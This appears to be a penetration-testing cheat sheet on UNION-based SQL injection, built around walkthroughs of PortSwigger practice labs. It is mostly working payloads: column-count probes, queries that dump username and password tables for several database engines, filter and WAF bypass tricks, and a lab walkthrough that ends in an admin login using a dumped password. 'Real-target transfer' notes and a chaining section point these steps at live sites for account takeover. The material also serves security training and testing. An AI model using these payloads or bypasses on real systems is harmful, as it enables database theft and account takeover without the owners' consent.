# SQL injection — UNION-based

When the query's results are rendered in the response, `UNION SELECT` appends rows from any table you choose into that output. This is the fastest path from "injectable" to "full database dump". Max impact: read every readable table (creds, PII, secrets) in a handful of requests.

## Quick reference

```
' ORDER BY 1--  ...  ' ORDER BY N--      -> column count: error at N+1
' UNION SELECT NULL--                    -> column count via nulls (add NULLs until 200/OK)
' UNION SELECT 'a',NULL,NULL--           -> find which column is string-typed
' UNION SELECT username,password FROM users--      -> dump (cols known)
' UNION SELECT username||'~'||password FROM users--  -> single usable column: concat
' UNION SELECT NULL FROM DUAL--          -> Oracle needs a FROM (use dual)
```

Decision list:
- Results rendered as a table/list → UNION is viable.
- Find column count first (ORDER BY ladder OR null-padding), then string column, then data.
- Only one string column? Concatenate with a separator.
- Need table/column names? → `../Examining-the-database/`.
- 500 on every null count? Response may be too generic → fall back to blind.

## Root cause
Same as all SQLi: unparameterized concatenation in a `SELECT` whose rows reach the response body. UNION requires (1) equal column count and (2) compatible types per column between the original and injected SELECT.

## Find it (recon and detection)
- Confirm injection (`'`, boolean pair) and that **rows are reflected** in the HTML (product list, search results, table).
- Determine column count — two methods:
  - **ORDER BY ladder:** `' ORDER BY 1--`, `2--`, `3--`… The first index that errors (HTTP 500 / "ORDER BY position out of range") = count+1. (Verified: `ORDER BY 4--`→500 means 3 columns.)
  - **NULL padding:** `' UNION SELECT NULL--`, `NULL,NULL--`, … The count that returns 200/extra row matches. NULL is type-agnostic so it won't throw on type mismatch.
- **Find a string-capable column:** place a marker string in each slot: `' UNION SELECT 'a',NULL,NULL--`, then `NULL,'a',NULL--`, etc. The slot that returns 200 **and echoes `a`** is your exfil channel. A type-incompatible slot throws `Conversion failed ... to data type int`.

## Technique
**1. Column count.** ORDER BY ladder or NULL padding (above). On MySQL remember `-- ` / `#`. On Oracle every SELECT needs `FROM`: `' UNION SELECT NULL FROM DUAL--`.

**2. String column discovery.** Walk a literal through each NULL position; the one that renders it holds your data.

**3. Retrieve data.** With count + a string slot known and table/column names known:
`' UNION SELECT username, password FROM users--`.

**4. Multiple values, one column.** If only one slot is string-typed (or the query returns one column), concatenate:
- Oracle/Postgres: `' UNION SELECT username || '~' || password FROM users--`
- MySQL: `' UNION SELECT CONCAT(username,'~',password) FROM users--`
- MSSQL: `' UNION SELECT username + '~' + password FROM users--`
Pick a separator (`~`) absent from the data so you can split fields.

**Advanced / edge cases:**
- **Type-strict columns:** if no column accepts strings, cast: `CAST(... AS varchar)` / `... || ''`. Or fall back to error-based / blind.
- **ORDER BY injection point:** if the injection is inside `ORDER BY`, you can't UNION directly — use the ORDER BY ladder for count, then switch technique (CASE-based blind in ORDER BY).
- **Dump many rows:** `... FROM users` returns all rows; if the page shows one row, add `LIMIT`/`OFFSET` or `WHERE` to page through, or concatenate with `STRING_AGG`/`GROUP_CONCAT`.
- `GROUP_CONCAT(username,0x7e,password)` (MySQL) / `string_agg(username||'~'||password, ',')` (Postgres) to pull the whole table into one cell.

## Payload arsenal
```sql
-- column count
' ORDER BY 1-- / 2-- / 3-- ...
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL FROM DUAL--           -- Oracle
-- string column probe
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
-- data retrieval
' UNION SELECT username, password FROM users--
' UNION SELECT NULL, username||'~'||password FROM users--        -- Oracle/Postgres
' UNION SELECT NULL, CONCAT(username,'~',password) FROM users--  -- MySQL
-- whole-table into one cell
' UNION SELECT NULL, string_agg(username||'~'||password, ', ') FROM users--   -- Postgres
' UNION SELECT NULL, GROUP_CONCAT(username,0x7e,password SEPARATOR ', ') FROM users--  -- MySQL
-- fingerprint+exfil in one
' UNION SELECT @@version, NULL--          -- MySQL/MSSQL
' UNION SELECT banner, NULL FROM v$version--  -- Oracle
```

## Bypasses
| Blocker | Bypass |
|---|---|
| `UNION` filtered | `UNION` case/encoding, `/*!UNION*/` (MySQL inline), `UNI/**/ON`, see `../WAF-filter-bypass/` |
| spaces filtered | `UNION/**/SELECT/**/NULL`, `%0a`, parentheses |
| only 1 column | concatenate fields with `||`/`CONCAT`/`+` |
| type mismatch | NULL for non-string slots; `CAST(x AS varchar)` for data |
| Oracle "FROM required" | append `FROM DUAL` |

## Exploitation walkthrough (dump → admin login)
1. `GET /filter?category=Accessories' ORDER BY 1--` … `4--` → 500 at 4 ⇒ **3 columns**.
2. `...Accessories' UNION SELECT NULL,'a',NULL--` → 200 with `a` shown ⇒ column 2 is string.
3. (If names unknown) enumerate via `../Examining-the-database/`; here table=`users`, cols=`username,password`.
4. `...x' UNION SELECT username, password FROM users--` → admin row appears in product list (verified: `administrator:qyf3s8rgihwby3v8qkyf`).
5. Log in as administrator with the dumped password → solved.

## Chaining
- → [Examining-the-database](../Examining-the-database/): you almost always need it to learn table/column names first.
- Dumped creds → [Authentication](../../Authentication/) / [Access-control](../../Access-control/) / account takeover.
- Read secrets/API keys from config tables → pivot to [SSRF](../../SSRF/) / cloud.

## Tools
- **Burp Repeater:** iterate ORDER BY / null counts and the string-slot probe by hand.
- **Burp Intruder:** number-payload the ORDER BY index or null count; watch the status flip.
- **sqlmap:** `--technique=U --dump` automates UNION discovery and extraction.

## Labs

### Lab: UNION attack, determining the number of columns [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
- Method: ladder `' ORDER BY n--` (or `' UNION SELECT NULL,...`) until error. Verified: ORDER BY 4 → 500, `UNION SELECT NULL,NULL,NULL--` → 200 ⇒ 3 columns. Solve = submit the matching-arity UNION.
- Insight: an out-of-range ORDER BY index or arity mismatch throws; the boundary reveals the count.
- Real-target transfer: on any reflected list, ladder ORDER BY until the response breaks.

### Lab: UNION attack, finding a column containing text [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
- Method: instance gives a random string (e.g. `sRElHX`). Cols=3; test `' UNION SELECT 's',NULL,NULL--` / `NULL,'s',NULL--` / `NULL,NULL,'s'--`. The 200+echo slot (col 2 in our run) is string-typed. Submitting it solves.
- Insight: type-incompatible column throws; the one that renders your string is the data channel.
- Real-target transfer: walk a marker through each NULL slot to locate where you can place exfil data.

### Lab: UNION attack, retrieving data from other tables [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
- Method: cols=2 both string. `' UNION SELECT username, password FROM users--`, read admin creds, log in. Verified.
- Insight: UNION pulls a foreign table straight into the visible list once arity/types line up.
- Real-target transfer: the creds-dump-then-login pattern; combine with schema enumeration when names are unknown.

### Lab: UNION attack, retrieving multiple values in a single column [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
- Method: only one column is string-typed. `' UNION SELECT NULL, username || '~' || password FROM users--` → `administrator~<pass>`; log in. Verified.
- Insight: concatenate multiple fields into the single usable column with a separator.
- Real-target transfer: when only one reflected/string column exists, concat everything you want with a delimiter.

## Real-world notes
- UNION SQLi on a search/listing endpoint is a classic full-DB-read; CVSS High–Critical depending on data sensitivity.
- False positive: an "extra row" that is actually the app's own empty-state — confirm your injected literal is echoed.
- Watch the OR-1=1 warning still applies if you reuse inputs that flow into write queries.

## References
- https://portswigger.net/web-security/sql-injection/union-attacks
- https://portswigger.net/web-security/sql-injection/cheat-sheet
